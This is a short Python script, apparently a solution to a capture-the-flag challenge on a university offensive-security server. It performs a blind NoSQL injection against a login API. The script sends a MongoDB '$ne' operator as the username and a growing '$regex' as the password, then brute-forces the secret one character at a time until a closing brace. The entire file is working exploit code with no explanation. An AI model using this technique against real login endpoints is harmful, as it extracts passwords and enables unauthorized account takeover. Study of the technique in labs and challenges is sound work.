import requests

alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890!_' + '{' + '}' #loop through this alphabet

endOfString = False
regex = "^"
while not endOfString:
    for i in alphabet:
        pwd = regex + i
        data={'username': {"$ne":""}, 'password': {"$regex":pwd}}
        r=requests.post("http://offsec-chalbroker.osiris.cyber.nyu.edu:10000/api/login", json=data)
        if i == '}':
            endOfString = True
        if not 'Invalid' in r.text:  #found flag letter
            print(pwd)
            print(r.text)
            regex = pwd
            break

